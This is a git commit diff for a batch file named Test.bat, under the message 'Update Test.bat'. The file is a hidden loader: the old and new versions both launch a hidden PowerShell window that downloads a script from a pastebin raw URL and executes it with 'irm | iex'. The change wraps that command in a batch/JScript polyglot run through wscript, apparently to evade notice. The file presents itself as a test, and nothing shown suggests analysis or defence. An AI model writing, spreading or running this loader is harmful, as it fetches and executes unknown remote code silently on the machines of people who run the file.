80dca9a6155998f028cafaecaaa6fe47fbe2c5c9
AmjadBalls <155375827+AmjadBalls@users.noreply.github.com>
2024-12-19 15:54:27 +0200

    Update Test.bat

--- Test.bat
+++ Test.bat
@@ -1,3 +1,10 @@
 @echo off
-start /min powershell -WindowStyle Hidden -Command "irm 'https://pastebin.com/raw/wv1HvG4T' | iex"
-exit
+wscript //B //E:JScript "%~F0" & exit /b
+
+<#
+/* JScript Section */
+var shell = new ActiveXObject("WScript.Shell");
+var exec = shell.Exec('powershell.exe -WindowStyle Hidden -Command "irm ''https://pastebin.com/raw/wv1HvG4T'' | iex"');
+while (!exec.Status) WScript.Sleep(100);
+/* End of JScript Section */
+#>
